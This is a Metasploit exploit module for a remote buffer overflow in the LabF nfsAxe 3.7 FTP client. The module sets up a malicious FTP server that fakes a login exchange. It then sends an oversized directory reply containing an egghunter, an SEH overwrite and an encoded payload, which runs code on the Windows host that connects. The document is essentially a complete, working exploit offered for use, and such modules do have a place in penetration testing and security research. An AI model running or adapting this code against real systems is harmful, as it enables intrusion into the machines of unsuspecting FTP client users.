##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Seh
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'LabF nfsAxe 3.7 FTP Client - Remote Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in the LabF nfsAxe 3.7 FTP Client allowing remote code execution.
      },
            'Author'   =>
        [
          'Tulpa',           # Original exploit author
          'Daniel Teixeira'  # MSF module author
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB', '42011' ],
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00\x0a\x10",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', {'Ret' => 0x6801549F } ] # p/p/r in wcmpa10.dll
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'SRVHOST' => '0.0.0.0',
        },
      'DisclosureDate' => 'May 15 2017',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The FTP port to listen on", 21 ]),
      ])
  end

  def on_client_connect(client)
    return if ((p = regenerate_payload(client)) == nil)

    client.get_once
    welcome = "220 Welcome.\r\n"
    client.put(welcome)

    client.get_once
    user = "331 OK.\r\n"
    client.put(user)

    client.get_once
    pass = "230 OK.\r\n"
    client.put(pass)
    client.get_once
    
    eggoptions = { :checksum => true }
    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
    
    sploit = "220 \""
    sploit << "A"*(9833 - egg.length)
    sploit << egg
    sploit << generate_seh_record(target.ret)
    sploit << hunter
    sploit << "C"*(576 - hunter.length)
    sploit << "\" is current directory\r\n"

    client.put(sploit)

  end
end
